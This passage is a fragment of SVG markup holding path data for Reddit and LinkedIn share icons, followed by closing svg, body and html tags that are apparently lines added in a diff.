d="M47.8,30.7c0-2.1-1.7-3.8-3.8-3.8c-0.9,0-1.7,0.3-2.4,0.9c-2.3-1.4-5.2-2.4-8.5-2.5l1.7-5.3 l4.6,1.1c0.1,1.6,1.5,3,3.2,3c1.8,0,3.2-1.4,3.2-3.2s-1.4-3.2-3.2-3.2c-1.2,0-2.3,0.7-2.8,1.7l-5.3-1.2c-0.4-0.1-0.9,0.1-1,0.6 l-2.1,6.5c-3.5,0.1-6.7,1-9.1,2.6c-0.7-0.5-1.5-0.9-2.4-0.9c-2.1,0-3.8,1.7-3.8,3.8c0,1.3,0.7,2.5,1.7,3.1c0,0.3-0.1,0.6-0.1,0.9 c0,5.3,6.4,9.6,14.2,9.6s14.2-4.3,14.2-9.6c0-0.3,0-0.6-0.1-0.9C47.2,33.2,47.8,32,47.8,30.7z M42.6,19.4c0.8,0,1.5,0.7,1.5,1.5 c0,0.8-0.7,1.5-1.5,1.5s-1.5-0.7-1.5-1.5C41.1,20,41.8,19.4,42.6,19.4z M17.8,30.7c0-1.2,0.9-2.1,2.1-2.1c0.3,0,0.6,0.1,0.9,0.2 c-1.1,0.9-2,2-2.5,3.2C18.1,31.7,17.8,31.2,17.8,30.7z M32,42.6c-6.9,0-12.5-3.5-12.5-7.9s5.6-7.9,12.5-7.9s12.5,3.5,12.5,7.9 S38.9,42.6,32,42.6z M45.6,32.1c-0.5-1.2-1.4-2.3-2.5-3.2c0.3-0.1,0.6-0.2,0.9-0.2c1.2,0,2.1,0.9,2.1,2.1 C46.2,31.2,45.9,31.7,45.6,32.1z M29.4,33.1c0-1.2-1-2.1-2.1-2.1s-2.1,1-2.1,2.1s1,2.2,2.1,2.2S29.4,34.2,29.4,33.1z M36.7,30.9 c-1.2,0-2.1,1-2.1,2.1s1,2.2,2.1,2.2c1.2,0,2.1-1,2.1-2.2S37.9,30.9,36.7,30.9z M36,38.2c-0.8,0.8-2.1,1.1-4,1.1 c-1.9,0-3.2-0.4-4-1.1c-0.3-0.3-0.9-0.3-1.2,0c-0.3,0.3-0.3,0.9,0,1.2c1.1,1.1,2.8,1.6,5.2,1.6c2.4,0,4.1-0.5,5.2-1.6 c0.3-0.3,0.3-0.9,0-1.2C36.9,37.8,36.3,37.8,36,38.2z"/></symbol><symbol id="reddit-mask" viewBox="0 0 64 64"><path d="M32,26.9c-6.9,0-12.5,3.5-12.5,7.9s5.6,7.9,12.5,7.9s12.5-3.5,12.5-7.9S38.9,26.9,32,26.9z M25.2,33.1 c0-1.2,1-2.1,2.1-2.1s2.1,1,2.1,2.1s-1,2.2-2.1,2.2S25.2,34.2,25.2,33.1z M37.2,39.4C36.1,40.5,34.4,41,32,41 c-2.4,0-4.1-0.5-5.2-1.6c-0.3-0.3-0.3-0.9,0-1.2c0.3-0.3,0.9-0.3,1.2,0c0.8,0.8,2.1,1.1,4,1.1c1.9,0,3.2-0.4,4-1.1 c0.3-0.3,0.9-0.3,1.2,0C37.5,38.5,37.5,39,37.2,39.4z M36.7,35.2c-1.2,0-2.1-1-2.1-2.2s1-2.1,2.1-2.1c1.2,0,2.1,1,2.1,2.1 S37.9,35.2,36.7,35.2z M44.1,28.6c-0.3,0-0.6,0.1-0.9,0.2c1.1,0.9,2,2,2.5,3.2c0.3-0.4,0.5-0.8,0.5-1.4 C46.2,29.6,45.2,28.6,44.1,28.6z M20.9,28.8c-0.3-0.1-0.6-0.2-0.9-0.2c-1.2,0-2.1,0.9-2.1,2.1c0,0.5,0.2,1,0.5,1.4 C18.9,30.9,19.8,29.8,20.9,28.8z M42.6,22.3c0.8,0,1.5-0.7,1.5-1.5c0-0.8-0.7-1.5-1.5-1.5s-1.5,0.7-1.5,1.5 C41.1,21.7,41.8,22.3,42.6,22.3z M0,0v64h64V0H0z M46.1,33.9c0,0.3,0.1,0.6,0.1,0.9c0,5.3-6.4,9.6-14.2,9.6S17.8,40,17.8,34.8 c0-0.3,0-0.6,0.1-0.9c-1-0.7-1.7-1.8-1.7-3.1c0-2.1,1.7-3.8,3.8-3.8c0.9,0,1.7,0.3,2.4,0.9c2.4-1.5,5.6-2.5,9.1-2.6l2.1-6.5 c0.1-0.4,0.6-0.7,1-0.6l5.3,1.2c0.5-1,1.6-1.7,2.8-1.7c1.8,0,3.2,1.4,3.2,3.2S44.3,24,42.6,24c-1.7,0-3-1.3-3.2-3L34.8,20l-1.7,5.3 c3.3,0.2,6.2,1.1,8.5,2.5c0.7-0.5,1.5-0.9,2.4-0.9c2.1,0,3.8,1.7,3.8,3.8C47.8,32,47.2,33.2,46.1,33.9z"/></symbol><symbol id="linkedin-icon" viewBox="0 0 64 64"><path d="M20.4,44h5.4V26.6h-5.4V44z M23.1,18c-1.7,0-3.1,1.4-3.1,3.1c0,1.7,1.4,3.1,3.1,3.1 c1.7,0,3.1-1.4,3.1-3.1C26.2,19.4,24.8,18,23.1,18z M39.5,26.2c-2.6,0-4.4,1.4-5.1,2.8h-0.1v-2.4h-5.2V44h5.4v-8.6 c0-2.3,0.4-4.5,3.2-4.5c2.8,0,2.8,2.6,2.8,4.6V44H46v-9.5C46,29.8,45,26.2,39.5,26.2z"/></symbol><symbol id="linkedin-mask" viewBox="0 0 64 64"><path d="M0,0v64h64V0H0z M25.8,44h-5.4V26.6h5.4V44z M23.1,24.3c-1.7,0-3.1-1.4-3.1-3.1c0-1.7,1.4-3.1,3.1-3.1 c1.7,0,3.1,1.4,3.1,3.1C26.2,22.9,24.8,24.3,23.1,24.3z M46,44h-5.4v-8.4c0-2,0-4.6-2.8-4.6c-2.8,0-3.2,2.2-3.2,4.5V44h-5.4V26.6 h5.2V29h0.1c0.7-1.4,2.5-2.8,5.1-2.8c5.5,0,6.5,3.6,6.5,8.3V44z"/></symbol></svg>
+
+  </body>
+</html>
